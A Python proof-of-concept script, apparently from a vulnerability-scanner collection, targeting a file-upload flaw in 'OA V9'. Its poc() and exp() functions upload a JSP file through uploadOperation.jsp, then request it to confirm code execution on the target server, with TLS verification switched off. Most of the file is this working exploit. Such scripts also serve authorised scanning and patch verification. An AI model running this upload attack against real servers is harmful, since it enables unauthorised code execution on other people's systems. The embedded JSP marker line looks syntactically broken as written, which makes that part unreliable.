import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''OA V9 RCE via File Upload''',
        "description": '''A vulnerability in OA V9 uploadOperation.jsp endpoint allows remote attackers to upload arbitrary files to the server. These files can be subsequently called and are executed by the remote software.''',
        "severity": "high",
        "references": [
            "https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "jsp"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/page/exportImport/uploadOperation.jsp"""
        method = "POST"
        data = """------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream

<%out.print(2be8e556fee1a876f10fa086979b8c7c);%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--"""
        headers = {'Origin': url, 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/page/exportImport/fileTransfer/poc.jsp"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp1.status_code == 200  and "2be8e556fee1a876f10fa086979b8c7c" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url